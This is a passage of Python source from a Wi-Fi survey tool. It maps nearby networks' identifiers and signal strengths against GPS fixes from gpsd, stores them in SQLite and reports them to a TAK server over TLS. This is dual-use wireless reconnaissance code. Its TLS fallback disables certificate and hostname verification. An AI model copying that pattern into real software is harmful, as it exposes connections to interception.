                                                    if self.gps_status != 'locked' and not recently_locked:
                                                        # If we were in 'no_data', reset to 'searching' to show recovery
                                                        if self.gps_status == 'no_data' or self.gps_status != 'searching':
                                                            self.gps_status = 'searching'
                                                            if hasattr(self, 'gps_status_callback'):
                                                                self.gps_status_callback('searching')
                                            else:
                                                # Mode is 0 or None - log this
                                                if not hasattr(self, '_last_mode0_log_fallback') or (time.time() - self._last_mode0_log_fallback) > 10:
                                                    self.log(f"GPS mode=0 (no data, fallback): mode={mode}, lat={lat}, lon={lon}", indent=8, prefix="dot")
                                                    self._last_mode0_log_fallback = time.time()
                                        except Exception:
                                            pass
                        except Exception as e:
                            # Error unpacking GPS data - log but continue
                            if self.verbose:
                                self.log(f"Error unpacking GPS data: {e}", prefix="error", indent=4)
                        
                        # Periodic status check - runs AFTER processing data to avoid race conditions
                        # This ensures we check status after updating last_gps_data_time
                        # IMPORTANT: This check should NOT override status that was just set by valid coordinate reception
                        # The status is set to 'locked' immediately when valid coordinates are received (line 1685)
                        # This periodic check only updates status if it's stale or incorrect
                        current_time = time.time()
                        if current_time - last_status_check >= 0.5:
                            with self.gps_lock:
                                # Check if we have recent valid coordinates (within 15 seconds - matches user requirement)
                                # gps_position_last_updated is only set when we receive valid lat/lon (mode >= 2, not NaN, not 0,0)
                                has_recent_valid_data = (
                                    self.gps_position_last_updated and 
                                    (current_time - self.gps_position_last_updated) < 15.0
                                )
                                
                                # Also check if gpsd is still sending data (even if coordinates are temporarily invalid)
                                # This prevents false "searching" status when GPS device is working but coordinates are temporarily unavailable
                                gpsd_still_sending = (current_time - last_gps_data_time) < 10.0  # Received data from gpsd in last 10 seconds
                                
                                # Only update status if it's not disabled or no_device
                                if self.gps_status not in ('disabled', 'no_device'):
                                    if has_recent_valid_data:
                                        # We have valid coordinates within the last 15 seconds - GPS MUST be locked
                                        # Always set to locked if we have recent valid data, regardless of current status
                                        # This ensures recovery from searching mode when valid coordinates return
                                        if self.gps_status != 'locked':
                                            self.gps_status = 'locked'
                                            if hasattr(self, 'gps_status_callback'):
                                                self.gps_status_callback('locked')
                                    elif gpsd_still_sending:
                                        # No valid coordinates recently, but gpsd is still sending data
                                        # GPS device is working, just temporarily no valid coordinates
                                        # Only change status if we're not already in a valid state
                                        if self.gps_status == 'locked':
                                            # Keep locked status - GPS is working, just temporary coordinate issue
                                            pass
                                        elif self.gps_status != 'searching':
                                            # If we weren't locked or searching, switch to searching
                                            self.gps_status = 'searching'
                                            if hasattr(self, 'gps_status_callback'):
                                                self.gps_status_callback('searching')
                                    else:
                                        # No valid coordinates for 15+ seconds AND gpsd hasn't sent data for 10+ seconds
                                        # This indicates GPS might not be working - switch to searching
                                        # But only if we're not already locked (locked status takes priority)
                                        if self.gps_status == 'locked':
                                            # If we're locked, don't switch to searching - might be temporary issue
                                            # The status will be updated when valid coordinates are received
                                            pass
                                        elif self.gps_status != 'searching':
                                            # Only switch to searching if we're not already there
                                            self.gps_status = 'searching'
                                            if hasattr(self, 'gps_status_callback'):
                                                self.gps_status_callback('searching')
                            last_status_check = current_time
                        
                        # Small sleep to prevent tight loop and allow other threads to run
                        time.sleep(0.1)
                        
                    except Exception as e:
                        # Don't clear on every error - might be transient
                        if self.verbose:
                            self.log(f"GPS polling error: {e}", prefix="error")
                        # Keep last known position on error
                        time.sleep(0.5)
                        continue
            except Exception as e:
                self.log(f"Failed to connect to gpsd: {e}", prefix="error")
                self.log("Make sure gpsd is running: sudo systemctl start gpsd", indent=4, prefix="error")
                with self.gps_lock:
                    self.latest_gps_position = None
                    self.gps_position_last_updated = None
                    self.gps_status = 'no_data'
                if hasattr(self, 'gps_status_callback'):
                    self.gps_status_callback('no_data')
            finally:
                if gps_socket:
                    try:
                        gps_socket.close()
                    except:
                        pass
        self.log("Started GPS polling thread using gps3.", indent=4, prefix="check")
        self.gps_thread = threading.Thread(target=poll, daemon=True)
        self.gps_thread.start()
        # Give the polling thread a moment to connect and log the connection message
        time.sleep(1.5)
        return True

    def stop_gps_polling(self):
        """
        Stops the GPS polling thread.
        """
        if not self.gps_thread:
            with self.gps_lock:
                self.gps_status = 'disabled'
            return  # Already stopped or never started
        self.gps_thread_stop.set()
        if self.gps_thread and self.gps_thread.is_alive():
            self.gps_thread.join(timeout=2)
        self.gps_thread = None
        with self.gps_lock:
            self.gps_status = 'disabled'
            self.latest_gps_position = None
            self.gps_position_last_updated = None
        # Update status callback if available
        if hasattr(self, 'gps_status_callback'):
            try:
                self.gps_status_callback('disabled')
            except:
                pass
        # Only log if we actually stopped something
        try:
            self.log("Stopped GPS polling thread.", prefix="check")
        except:
            pass  # Don't fail if logging fails during shutdown

    def get_gps_position(self, timeout=0.1):
        """
        Returns the latest GPS position from the polling thread (if available).
        Returns a copy to avoid race conditions.
        Uses a non-blocking lock with timeout to prevent deadlocks.
        """
        # Try to acquire lock with timeout to prevent blocking indefinitely
        if self.gps_lock.acquire(blocking=True, timeout=timeout):
            try:
                if self.latest_gps_position:
                    # Return a deep copy to ensure we get the current state
                    return {
                        'latitude': self.latest_gps_position.get('latitude'),
                        'longitude': self.latest_gps_position.get('longitude'),
                        'altitude': self.latest_gps_position.get('altitude'),
                        'timestamp': self.latest_gps_position.get('timestamp')
                    }
                return None
            finally:
                self.gps_lock.release()
        else:
            # Lock acquisition timed out - return None to avoid blocking
            if self.debug:
                self.log(f"get_gps_position: Lock timeout ({timeout}s), returning None", indent=8, prefix="dot")
            return None

    def _nmea_to_decimal(self, nmea_coord, direction):
        """
        Convert NMEA coordinate format to decimal degrees.
        """
        degrees = int(nmea_coord / 100)
        minutes = nmea_coord - (degrees * 100)
        decimal = degrees + (minutes / 60)
        
        if direction in ['S', 'W']:
            decimal = -decimal
            
        return decimal

    def start_signal_tracking(self, max_attempts=25, scan_interval=3, gps_lock_attempts=20, gps_lock_wait=5):
        """
        Track all detected networks' signal strengths with GPS coordinates.
        Each scan records all visible networks with their power and GPS.
        Wait for a *new* GPS fix before each scan.
        """
        self.tracking_active = True
        session_id = f"track_{self.timestamp}"

        self.log(f"Starting map ID: {session_id}", prefix="config")

        # GPS polling via gps3 should already be started by now (done in main execution)
        # Note: gps_serial is optional - gps3 handles GPS via gpsd, so serial connection not required
        # Check if GPS polling is active instead
        if not self.gps_thread or not self.gps_thread.is_alive():
            self.log("GPS polling not active. This should not happen.", prefix="error", indent=4)
            sys.exit(1)
        
        # Store original GPS status to restore after map mode (if needed)
        # GPS status should remain as-is (locked/searching) after map mode completes

        def get_fresh_gps_fix():
            """Get the most current GPS position from the device."""
            gps_wait_attempts = 0
            last_seen_position = None
            try:
                while gps_wait_attempts < gps_lock_attempts:
                    # Get the latest GPS position
                    gps_data = self.get_gps_position()
                    
                    # Check if we have valid GPS data
                    if gps_data and gps_data.get('latitude') is not None and gps_data.get('longitude') is not None:
                        # Check if this is a new position (different coordinates or first time)
                        is_new_position = (
                            last_seen_position is None or
                            abs(gps_data.get('latitude', 0) - last_seen_position.get('latitude', 0)) > 0.000001 or
                            abs(gps_data.get('longitude', 0) - last_seen_position.get('longitude', 0)) > 0.000001 or
                            gps_data.get('timestamp') != last_seen_position.get('timestamp')
                        )
                        
                        if is_new_position:
                            # Wait a brief moment to ensure we have the freshest data
                            try:
                                time.sleep(0.3)
                            except KeyboardInterrupt:
                                raise
                            # Get it again to ensure we have the absolute latest
                            fresh_gps_data = self.get_gps_position()
                            if fresh_gps_data and fresh_gps_data.get('latitude') is not None and fresh_gps_data.get('longitude') is not None:
                                return fresh_gps_data
                        else:
                            # Same position - wait a bit longer for GPS to update
                            if self.verbose:
                                self.log(f"GPS position unchanged, waiting for update...", indent=8, prefix="error")
                            try:
                                time.sleep(1.0)
                            except KeyboardInterrupt:
                                raise
                            continue
                    else:
                        # No valid GPS data - show None for troubleshooting
                        if self.verbose:
                            self.log(f"No valid GPS data (got: {gps_data})", indent=8, prefix="error")
                    
                    if self.verbose:
                        if gps_wait_attempts == 0:
                            self.log("Waiting for GPS fix...", indent=4, prefix="error")
                        else:
                            self.log(f"No GPS fix yet. Retrying in {gps_lock_wait} seconds... (Attempt {gps_wait_attempts+1}/{gps_lock_attempts})", indent=8, prefix="error")
                    gps_wait_attempts += 1
                    try:
                        time.sleep(gps_lock_wait)
                    except KeyboardInterrupt:
                        raise
                self.log(f"No GPS fix after {gps_lock_attempts} attempts. Exiting.", prefix="x")
                sys.exit(1)
            except KeyboardInterrupt:
                raise  # Re-raise to stop the main program

        unlimited_scans = (max_attempts == 0)
        if unlimited_scans:
            self.log("Unlimited scans enabled. Press Ctrl+C to stop.", prefix="error")
        
        attempt = 0
        try:
            while self.tracking_active:
                attempt += 1
                
                # Send periodic keepalive to TAK server if enabled
                if self.tak_enabled and self.tak_connected:
                    current_time = time.time()
                    if (self.tak_last_keepalive is None or 
                        current_time - self.tak_last_keepalive >= self.tak_keepalive_interval):
                        try:
                            self._send_tak_presence()
                            self.tak_last_keepalive = current_time
                            if self.verbose:
                                self.log("Sent TAK keepalive", indent=8, prefix="plus")
                        except Exception as e:
                            if self.verbose:
                                self.log(f"Keepalive failed: {e}", indent=8, prefix="error")
                            # Check if connection is still alive
                            if not self.tak_connected:
                                self.log("TAK connection lost, attempting to reconnect...", prefix="error", indent=4)
                                reconnect_success = self.init_tak_connection(
                                    self.tak_host, self.tak_port, self.tak_protocol,
                                    self.tak_cert_file, self.tak_key_file, self.tak_ca_file, self.tak_api_token,
                                    cert_password=getattr(self, 'tak_cert_password', None)
                                )
                                if not reconnect_success:
                                    self.log("TAK reconnection failed. Exiting.", prefix="x", indent=4)
                                    sys.exit(1)
                if unlimited_scans:
                    self.log(f"[Scan Attempt {attempt} (unlimited)]", prefix="moved")
                else:
                    if attempt > max_attempts:
                        break
                    self.log(f"[Scan Attempt {attempt}/{max_attempts}]", prefix="moved")

                # Step 1: Get fresh GPS fix
                self.log(f"Acquiring GPS location...", indent=4, prefix="dot")
                gps_data = get_fresh_gps_fix()
                if self.verbose:
                    self.log(f"GPS location: {gps_data['latitude']:.6f}, {gps_data['longitude']:.6f}, {gps_data['altitude']:.2f} - timestamp: {gps_data.get('timestamp')}", indent=8, prefix="check")

                # Step 2: Immediately scan for networks
                try:
                    # Check tracking_active before scanning
                    if not self.tracking_active:
                        break
                    if not self.scan_networks(timeout=scan_interval):
                        self.log("Scan failed.", indent=8, prefix="error")
                        continue
                except KeyboardInterrupt:
                    # Re-raise to be caught by outer handler
                    raise

                # Step 3: Record all found networks with current GPS data
                if not self.networks:
                    self.log("No networks found in scan.", indent=4, prefix="error")
                else:
                    self.log(f"Found {len(self.networks)} networks", indent=4, prefix="check")
                    
                    # Collect all network data for this scan
                    scan_networks = []
                    for essid, net in self.networks.items():
                        self.record_signal_data(
                            essid=essid,
                            bssid=net['BSSID'],
                            channel=net['Channel'],
                            signal_strength=net['Power'],
                            gps_data=gps_data,
                            session_id=session_id
                        )
                        # Always log "Recorded:" messages for display/logging purposes
                        self.log(f"Recorded: {essid} | Signal: {net['Power']} | GPS: {gps_data['latitude']:.6f}, {gps_data['longitude']:.6f}", indent=8, prefix="plus")
                        
                        # Collect network data for aggregated CoT message
                        scan_networks.append({
                            'essid': essid,
                            'bssid': net['BSSID'],
                            'channel': str(net['Channel']) if net['Channel'] else '0',
                            'signal': str(net['Power']),
                            'altitude': gps_data.get('altitude', 0.0)
                        })
                    
                    # Send ONE aggregated CoT message for this scan with all networks
                    if self.tak_enabled and self.tak_connected and scan_networks:
                        try:
                            # Build remarks with all network information
                            remarks_parts = [f"Scan Location: {gps_data['latitude']:.6f}, {gps_data['longitude']:.6f}"]
                            remarks_parts.append(f"Networks Found: {len(scan_networks)}")
                            remarks_parts.append("")
                            remarks_parts.append("Network Details:")
                            for net in scan_networks:
                                remarks_parts.append(f"  ESSID: {net['essid']}")
                                remarks_parts.append(f"    BSSID: {net['bssid']}")
                                remarks_parts.append(f"    Channel: {net['channel']}")
                                remarks_parts.append(f"    Signal: {net['signal']} dBm")
                                remarks_parts.append("")
                            
                            remarks = "\n".join(remarks_parts)
                            
                            # Use first network's data for the CoT message
                            first_net = scan_networks[0]
                            
                            # Send aggregated CoT message
                            cot_sent = self.send_tak_cot(
                                essid=f"Scan_{len(scan_networks)}Nets",
                                bssid=first_net['bssid'],
                                channel=first_net['channel'],
                                signal_strength=first_net['signal'],
                                gps_data=gps_data,
                                remarks=remarks
                            )
                            
                            if cot_sent and self.verbose:
                                self.log(f"Sent aggregated CoT for scan at {gps_data['latitude']:.6f}, {gps_data['longitude']:.6f} with {len(scan_networks)} networks", indent=8, prefix="plus")
                        except Exception as e:
                            self.log(f"Failed to send aggregated CoT: {e}", indent=8, prefix="error")
                            if self.verbose:
                                import traceback
                                traceback.print_exc()
                
        except KeyboardInterrupt:
            self.log("Signal tracking stopped by user", prefix="exited")
            self.tracking_active = False
            # Ensure interface is up (but keep it in monitor mode)
            self._ensure_interface_up()
            raise
        
        self.tracking_active = False
        # Do NOT call clean() here - that should only run on explicit clean mode
        # Do NOT stop monitor mode - interface should remain in monitor mode between executions
        # Just ensure the interface is up (not in DOWN state)
        self._ensure_interface_up()
        return True

    def record_signal_data(self, essid, bssid, channel, signal_strength, gps_data, session_id):
        """
        Record a signal strength data point with GPS coordinates to the database.
        Each scan records the current GPS location at the time of the scan.
        """
        now = datetime.now().isoformat()
        
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        
        # Get initial values from first record of this network in this session (if exists)
        c.execute('''
            SELECT initial_latitude, initial_longitude, initial_altitude, initial_timestamp, initial_signal_strength
            FROM signal_tracking
            WHERE essid = ? AND bssid = ? AND session_id = ?
            ORDER BY timestamp ASC
            LIMIT 1
        ''', (essid, bssid, session_id))
        
        existing_record = c.fetchone()
        
        # If this is the first time seeing this network in this session, use current GPS as initial
        if existing_record is None:
            initial_latitude = gps_data['latitude'] if gps_data else None
            initial_longitude = gps_data['longitude'] if gps_data else None
            initial_altitude = gps_data['altitude'] if gps_data else None
            initial_timestamp = gps_data.get('timestamp') if gps_data else now
            initial_signal_strength = signal_strength
        else:
            # Use the initial values from the first record of this network in this session
            initial_latitude = existing_record[0]
            initial_longitude = existing_record[1]
            initial_altitude = existing_record[2]
            initial_timestamp = existing_record[3]
            initial_signal_strength = existing_record[4]
        
        # Store current GPS coordinates (these will be different for each scan if device is moving)
        c.execute('''
            INSERT INTO signal_tracking (
                essid, bssid, channel, signal_strength, 
                latitude, longitude, altitude, timestamp, session_id,
                initial_signal_strength, initial_latitude, initial_longitude, 
                initial_altitude, initial_timestamp
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            essid, bssid, channel, signal_strength,
            gps_data['latitude'] if gps_data else None,
            gps_data['longitude'] if gps_data else None,
            gps_data['altitude'] if gps_data else None,
            now, session_id,
            initial_signal_strength,
            initial_latitude,
            initial_longitude,
            initial_altitude,
            initial_timestamp
        ))
        
        conn.commit()
        conn.close()

    def export_tracking_data(self, session_id=None, output_format="json"):
        """
        Export tracking data for visualization. Can filter by session_id.
        """
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        
        if session_id:
            c.execute('''
                SELECT * FROM signal_tracking 
                WHERE session_id = ? 
                ORDER BY timestamp
            ''', (session_id,))
        else:
            c.execute('''
                SELECT * FROM signal_tracking 
                ORDER BY session_id, timestamp
            ''')
        
        rows = c.fetchall()
        conn.close()
        
        # Get column names
        columns = [description[0] for description in c.description]
        
        # Convert to list of dicts
        data = []
        for row in rows:
            data.append(dict(zip(columns, row)))
        
        # Check output directory exists
        if not os.path.exists("tracking"):
            self.log("ERROR: 'tracking' directory not found.", prefix="x")
            self.log("Please run './start.sh' to create required directories.", indent=4, prefix="error")
            return False
        
        if output_format == "json":
            filename = f"tracking/tracking_data_{session_id or 'all'}.json"
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
        elif output_format == "csv":
            filename = f"tracking/tracking_data_{session_id or 'all'}.csv"
            with open(filename, 'w', newline='') as f:
                import csv
                writer = csv.DictWriter(f, fieldnames=columns)
                writer.writeheader()
                writer.writerows(data)
        
        self.log(f"Tracking data exported to {filename}", prefix="check")
        return filename

    def load_gps_config(self):
        """
        Load the network gpsd target (host/port) from config/config.ini [GPS].
        overwatch branch: GPS is always a network gpsd client (no local serial
        GPS device) — see GPS.md. Falls back to the OVERWATCH PVE host defaults
        (10.0.0.2:2947) if no [GPS] section or values are present.
        """
        if not os.path.exists("config/config.ini"):
            return

        config = configparser.ConfigParser()
        config.read("config/config.ini")

        if "GPS" in config:
            gps_config = config["GPS"]
            host = gps_config.get("host", "").strip()
            if host:
                self.gps_network_host = host
            self.gps_network_port = gps_config.getint("port", fallback=self.gps_network_port)

    def load_tak_config(self):
        """
        Load TAK server configuration from config/config.ini.
        Certificate paths are resolved relative to the 'tak' folder.
        """
        if not os.path.exists("config/config.ini"):
            return
        
        config = configparser.ConfigParser()
        config.read("config/config.ini")
        
        if "TAK" in config:
            tak_config = config["TAK"]
            # Only load if enabled
            if tak_config.getboolean("enabled", fallback=False):
                self.tak_enabled = True
                self.tak_host = tak_config.get("host", "").strip()
                if self.tak_host:
                    self.tak_port = tak_config.getint("port", fallback=8087)
                    self.tak_protocol = tak_config.get("protocol", "tcp").strip().lower()
                    if self.tak_protocol not in ['tcp', 'udp']:
                        self.tak_protocol = 'tcp'
                    
                    # Certificate files - resolve paths relative to tak folder
                    cert_file = tak_config.get("cert_file", "").strip()
                    key_file = tak_config.get("key_file", "").strip()
                    ca_file = tak_config.get("ca_file", "").strip()
                    # Note: cert_password is NOT loaded from config/config.ini for security
                    # Password will be prompted via CLI if needed
                    if cert_file:
                        # If path doesn't start with /, assume it's in tak folder
                        if not os.path.isabs(cert_file):
                            cert_file = os.path.join("tak", cert_file)
                        if os.path.exists(cert_file):
                            self.tak_cert_file = cert_file
                        else:
                            self.log(f"TAK cert_file not found: {cert_file}", prefix="warning", indent=4)
                            self.log(f"  TLS will not be enabled. Check filename in config/config.ini", prefix="warning", indent=4)
                    if key_file:
                        if not os.path.isabs(key_file):
                            key_file = os.path.join("tak", key_file)
                        if os.path.exists(key_file):
                            self.tak_key_file = key_file
                    if ca_file:
                        if not os.path.isabs(ca_file):
                            ca_file = os.path.join("tak", ca_file)
                        if os.path.exists(ca_file):
                            self.tak_ca_file = ca_file
                    
                    # PKCS#12 password is NOT stored - will be prompted via CLI if needed
                    self.tak_cert_password = None
                    
                    # API token
                    api_token = tak_config.get("api_token", "").strip()
                    if api_token:
                        self.tak_api_token = api_token

    def init_tak_connection(self, host, port=8087, protocol='tcp', cert_file=None, key_file=None, ca_file=None, api_token=None, cert_password=None):
        """
        Initialize connection to TAK server.
        Returns True on success, False on failure.
        """
        # Note: os, socket, ssl, tempfile, subprocess, time are imported at module level
        
        self.tak_enabled = True
        self.tak_host = host
        self.tak_port = port
        self.tak_protocol = protocol.lower()
        self.tak_cert_file = cert_file
        self.tak_key_file = key_file
        self.tak_ca_file = ca_file
        self.tak_api_token = api_token
        # Use provided password or fall back to loaded config
        if cert_password is None:
            cert_password = getattr(self, 'tak_cert_password', None)
        
        if not host:
            self.log("TAK host not specified", prefix="error", indent=4)
            return False
        
        # Validate certificate files if provided
        if self.verbose:
            self.log("TAK Connection Debug - Certificate file validation:", indent=4, prefix="dot")
            self.log(f"  cert_file parameter: {repr(cert_file)}", indent=8, prefix="dot")
            self.log(f"  key_file parameter: {repr(key_file)}", indent=8, prefix="dot")
            self.log(f"  ca_file parameter: {repr(ca_file)}", indent=8, prefix="dot")
        
        if cert_file and not os.path.exists(cert_file):
            self.log(f"Certificate file not found: {cert_file}", prefix="error", indent=4)
            if self.verbose:
                self.log(f"  Current working directory: {os.getcwd()}", indent=8, prefix="dot")
                self.log(f"  Absolute path would be: {os.path.abspath(cert_file)}", indent=8, prefix="dot")
            return False
        if key_file and not os.path.exists(key_file):
            self.log(f"Private key file not found: {key_file}", prefix="error", indent=4)
            return False
        if ca_file and not os.path.exists(ca_file):
            self.log(f"CA certificate file not found: {ca_file}", prefix="error", indent=4)
            if self.verbose:
                self.log(f"  Current working directory: {os.getcwd()}", indent=8, prefix="dot")
                self.log(f"  Absolute path would be: {os.path.abspath(ca_file)}", indent=8, prefix="dot")
            return False
        
        if self.verbose:
            if cert_file:
                self.log(f"  cert_file exists: {os.path.exists(cert_file)}", indent=8, prefix="dot")
                if os.path.exists(cert_file):
                    self.log(f"  cert_file is .p12/.pfx: {cert_file.lower().endswith(('.p12', '.pfx'))}", indent=8, prefix="dot")
            if key_file:
                self.log(f"  key_file exists: {os.path.exists(key_file)}", indent=8, prefix="dot")
            if ca_file:
                self.log(f"  ca_file exists: {os.path.exists(ca_file)}", indent=8, prefix="dot")
        
        try:
            if self.tak_protocol == 'tcp':
                self.tak_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                # Determine if we need TLS
                # TLS is needed if:
                # 1. cert_file is a .p12/.pfx file (contains both cert and key)
                # 2. OR both cert_file and key_file are provided
                use_tls = False
                cert_path = None
                key_path = None
                
                if cert_file:
                    if cert_file.lower().endswith(('.p12', '.pfx')):
                        # PKCS#12 file contains both cert and key
                        use_tls = True
                        # Extract cert and key from .p12 to temporary PEM files
                        try:
                            # Note: tempfile, subprocess, os are imported at module level
                            
                            temp_cert = tempfile.NamedTemporaryFile(mode='w', suffix='.pem', delete=False)
                            temp_key = tempfile.NamedTemporaryFile(mode='w', suffix='.pem', delete=False)
                            temp_cert.close()
                            temp_key.close()
                            
                            # Extract certificate (prompt for password if needed)
                            # Get password from parameter first, then try empty password
                            p12_password = cert_password
                            max_attempts = 5  # Increased to allow for password + legacy retries
                            attempt = 0
                            extraction_success = False
                            use_legacy = False  # Track if we need to use -legacy flag for OpenSSL 3.0+
                            
                            while attempt < max_attempts and not extraction_success:
                                if attempt == 0 and p12_password is None:
                                    # First attempt: try empty password
                                    pass_arg = 'pass:'
                                    if self.verbose:
                                        self.log("TAK Connection Debug - Trying PKCS#12 extraction without password", indent=4, prefix="dot")
                                elif p12_password is None:
                                    # Check if we have a password callback (for GUI mode)
                                    if hasattr(self, 'tak_password_callback') and self.tak_password_callback:
                                        try:
                                            p12_password = self.tak_password_callback()
                                            if not p12_password:
                                                self.log("Empty password provided. Trying again...", prefix="warning", indent=4)
                                                attempt += 1
                                                continue
                                            pass_arg = f'pass:{p12_password}'
                                            if self.verbose:
                                                self.log("TAK Connection Debug - Using password from callback", indent=4, prefix="dot")
                                        except Exception as e:
                                            self.log(f"Password callback failed: {e}", prefix="error", indent=4)
                                            os.unlink(temp_cert.name)
                                            os.unlink(temp_key.name)
                                            return False
                                    else:
                                        # Fall back to CLI prompt
                                        try:
                                            p12_password = getpass.getpass("Enter PKCS#12 certificate password: ")
                                            if not p12_password:
                                                self.log("Empty password provided. Trying again...", prefix="warning", indent=4)
                                                attempt += 1
                                                continue
                                            pass_arg = f'pass:{p12_password}'
                                            if self.verbose:
                                                self.log("TAK Connection Debug - Using password from CLI prompt", indent=4, prefix="dot")
                                        except (KeyboardInterrupt, EOFError):
                                            self.log("Password entry cancelled.", prefix="error", indent=4)
                                            os.unlink(temp_cert.name)
                                            os.unlink(temp_key.name)
                                            return False
                                else:
                                    # Use provided password
                                    pass_arg = f'pass:{p12_password}'
                                    if self.verbose:
                                        self.log("TAK Connection Debug - Using provided password", indent=4, prefix="dot")
                                
                                # Build openssl command with optional -legacy flag for OpenSSL 3.0+
                                cert_cmd = ['openssl', 'pkcs12', '-in', cert_file, '-out', temp_cert.name, 
                                           '-clcerts', '-nokeys', '-passin', pass_arg]
                                key_cmd = ['openssl', 'pkcs12', '-in', cert_file, '-out', temp_key.name, 
                                          '-nocerts', '-nodes', '-passin', pass_arg]
                                
                                if use_legacy:
                                    # Add -legacy flag for OpenSSL 3.0+ compatibility
                                    cert_cmd.insert(2, '-legacy')
                                    key_cmd.insert(2, '-legacy')
                                    if self.verbose:
                                        self.log("TAK Connection Debug - Using -legacy flag for OpenSSL 3.0+ compatibility", indent=4, prefix="dot")
                                
                                cert_result = subprocess.run(
                                    cert_cmd,
                                    check=False, capture_output=True, timeout=5
                                )
                                # Extract private key
                                key_result = subprocess.run(
                                    key_cmd,
                                    check=False, capture_output=True, timeout=5
                                )
                                
                                if cert_result.returncode == 0 and key_result.returncode == 0:
                                    extraction_success = True
                                    cert_path = temp_cert.name
                                    key_path = temp_key.name
                                    # Store for cleanup
                                    self._tak_temp_cert = temp_cert.name
                                    self._tak_temp_key = temp_key.name
                                    if self.verbose:
                                        self.log(f"TAK Connection Debug - Extracted cert and key from PKCS#12", indent=4, prefix="dot")
                                else:
                                    cert_err = cert_result.stderr.decode('utf-8', errors='ignore') if cert_result.stderr else ''
                                    
                                    # Check if it's an OpenSSL 3.0+ legacy algorithm error FIRST (before incrementing attempt)
                                    if ('0308010C' in cert_err or 'digital envelope routines' in cert_err.lower() or 
                                        'unsupported' in cert_err.lower() or 'algorithm' in cert_err.lower()):
                                        # OpenSSL 3.0+ legacy algorithm error - retry with -legacy flag
                                        if not use_legacy:
                                            use_legacy = True
                                            if self.verbose:
                                                self.log("TAK Connection Debug - OpenSSL 3.0+ legacy algorithm error detected, retrying with -legacy flag", indent=4, prefix="dot")
                                            # Don't increment attempt, just retry with legacy flag
                                            continue
                                        else:
                                            # Already tried with legacy flag, must be a different error
                                            attempt += 1
                                            if attempt >= max_attempts:
                                                break
                                    # Check if it's a password error
                                    elif 'mac verify error' in cert_err.lower() or 'invalid password' in cert_err.lower():
                                        attempt += 1
                                        if attempt < max_attempts:
                                            self.log("Invalid password. Please try again.", prefix="warning", indent=4)
                                            p12_password = None  # Reset to prompt again
                                            use_legacy = False  # Reset legacy flag when password changes
                                        else:
                                            break
                                    else:
                                        # Not a password or legacy error, increment and break
                                        attempt += 1
                                        if attempt >= max_attempts:
                                            break
                            
                            if not extraction_success:
                                # Cleanup on failure
                                os.unlink(temp_cert.name)
                                os.unlink(temp_key.name)
                                self.log("PKCS#12 extraction failed after multiple attempts.", prefix="error", indent=4)
                                if self.verbose:
                                    cert_err = cert_result.stderr.decode('utf-8', errors='ignore') if cert_result.stderr else ''
                                    key_err = key_result.stderr.decode('utf-8', errors='ignore') if key_result.stderr else ''
                                    self.log(f"  Certificate extraction error: {cert_err[:200]}", indent=8, prefix="dot")
                                    self.log(f"  Key extraction error: {key_err[:200]}", indent=8, prefix="dot")
                                self.log("Convert manually: openssl pkcs12 -in lab-field.p12 -out cert.pem -clcerts -nokeys -passin pass:YOUR_PASSWORD", prefix="error", indent=4)
                                self.log("                    openssl pkcs12 -in lab-field.p12 -out key.pem -nocerts -nodes -passin pass:YOUR_PASSWORD", prefix="error", indent=4)
                                return False
                        except FileNotFoundError:
                            self.log("openssl not found. Cannot extract PKCS#12 certificate.", prefix="error", indent=4)
                            self.log("Install openssl or convert .p12 to PEM format manually.", prefix="error", indent=4)
                            return False
                        except Exception as e:
                            self.log(f"PKCS#12 extraction error: {e}", prefix="error", indent=4)
                            return False
                    elif key_file:
                        # Separate cert and key files
                        use_tls = True
                        cert_path = cert_file
                        key_path = key_file
                
                # Connect first (TLS handshake happens after connection)
                # Test basic connectivity first
                if self.verbose:
                    self.log(f"TAK Connection Debug - Testing connectivity to {host}:{port}...", indent=4, prefix="dot")
                    # Try a quick connection test
                    test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    test_socket.settimeout(2)
                    try:
                        test_socket.connect((host, port))
                        test_socket.close()
                        self.log("TAK Connection Debug - Basic TCP connectivity test passed", indent=4, prefix="dot")
                    except Exception as test_e:
                        self.log(f"TAK Connection Debug - Basic connectivity test failed: {test_e}", indent=4, prefix="warning")
                        self.log("TAK Connection Debug - This may indicate a firewall or network issue", indent=4, prefix="warning")
                
                self.tak_socket.settimeout(10)
                if self.verbose:
                    self.log(f"TAK Connection Debug - Connecting to {host}:{port}...", indent=4, prefix="dot")
                try:
                    self.tak_socket.connect((host, port))
                    if self.verbose:
                        self.log("TAK Connection Debug - TCP connection established", indent=4, prefix="dot")
                        try:
                            peer = self.tak_socket.getpeername()
                            self.log(f"TAK Connection Debug - Connected to {peer[0]}:{peer[1]}", indent=8, prefix="dot")
                        except:
                            pass
                except socket.timeout:
                    self.log(f"Connection timeout: TAK server at {host}:{port} did not respond within 10 seconds", prefix="error", indent=4)
                    self.log(f"Port {port} is listening on TAK Server, but connection timed out.", prefix="error", indent=4)
                    self.log(f"Possible causes:", prefix="error", indent=4)
                    self.log(f"  1. Firewall blocking port {port} between client and server", indent=8, prefix="dot")
                    self.log(f"  2. Network routing issue", indent=8, prefix="dot")
                    self.log(f"  3. TAK Server rejecting connections (check server logs)", indent=8, prefix="dot")
                    self.log(f"Test connectivity: telnet {host} {port}", indent=4, prefix="dot")
                    return False
                except socket.error as e:
                    self.log(f"Connection error: {e}", prefix="error", indent=4)
                    self.log(f"Port {port} may not be accessible. Check firewall and TAK Server status.", prefix="error", indent=4)
                    self.log(f"Test connectivity: telnet {host} {port}", indent=4, prefix="dot")
                    return False
                
                # Wrap with TLS after connection (if using TLS)
                if use_tls:
                    # SSL/TLS connection with certificates
                    try:
                        # Note: ssl is imported at module level
                        import ssl
                        context = ssl.create_default_context()
                        if ca_file:
                            context.load_verify_locations(ca_file)
                        else:
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                        context.load_cert_chain(cert_path, key_path)
                        
                        # Determine server hostname for TLS
                        # If connecting by IP address, don't verify hostname (certificate may be for hostname)
                        # If connecting by hostname, use it for verification
                        import re
                        is_ip = re.match(r'^\d+\.\d+\.\d+\.\d+$', host) is not None
                        if is_ip:
                            # Connecting by IP - disable hostname verification
                            context.check_hostname = False
                            tls_hostname = None
                            if self.verbose:
